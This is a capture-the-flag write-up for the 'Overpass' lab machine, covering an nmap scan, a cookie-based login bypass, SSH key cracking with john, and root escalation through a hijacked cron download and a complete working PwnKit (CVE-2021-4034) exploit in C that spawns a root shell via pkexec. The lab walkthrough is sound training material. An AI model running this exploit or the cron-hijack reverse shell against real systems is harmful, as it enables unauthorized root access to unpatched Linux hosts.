# Overpass 
## IP : 10.10.215.35

- Scan using `nmap -sC -sV 10.10.215.35 > nmap_log`
```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-13 17:00 WIB
Nmap scan report for 10.10.215.35
Host is up (0.36s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.93 seconds
```
- We show the port 80 http is open try to scan using gobuster
- On gobuster we get `/admin` directory 
- Check script javascipt on `admin` url and then we show :
```js
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
- Function login have a condition where response === "Incorrect Credentials" it's will fire up when whe try to submit with false credential
- After some research the Login function will execute the else condition if the return is not equals with `Incorrect Credentials` so we can modified this using Burp Suite intercept the response or just set the cookie using javascript console
- After success to modified the cookie or intercept the connection we will got the private key rsa on admin page
- Copy that rsa and try to crack that using 
```
ssh2john id_rsa > rsa_key_hash
john --wordlist=/usr/share/wordlist/rockyou.txt rsa_key_hash
```
- After got the passphrase then ssh to the server
- On `/home/james` we got the flag

# Priviledge Escalation
## There is few ways to got priviledges 
### 1. Using Linpeas and got the crontab that root created
- change the `/etc/hosts` add our IP_ADDRESS to `overpass.thm` on that 
- Then Server on port 80 
    - Add `download/src` on that public server
    - Add `buildscript.sh` as reverse shell to our IP_ADDRESS 
- Listen on for revershe shell 
- And Congat's we got the root access

### 2. Using Linpeas we got the CVE-2021-4034
- we saw the linpeas log as ..
```bash
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.21p2

Vulnerable to CVE-2021-4034

./linpeas.sh: 1188: ./linpeas.sh: [[: not found
./linpeas.sh: 1188: ./linpeas.sh: rpm: not found
./linpeas.sh: 1188: ./linpeas.sh: 0: not found
```
- So we try using this vuln create file `Makefile, evil-so.c, exploit.c`
```makefile
all:
	gcc -shared -o evil.so -fPIC evil-so.c
	gcc exploit.c -o exploit
clean:
    rm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm evil.so
```
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0); 
    execve("/bin/sh", NULL, NULL);
}
```
```c
#include <stdio.h>
#include <stdlib.h>
#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"
int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " EVILSO ".so " DIR);    
    execve(BIN, argv, envp);    
    return 0;
}
```
- Compile using `make all` after compile success we got the `evil.so` and `exploit`
- Run the exploit and boom! you got root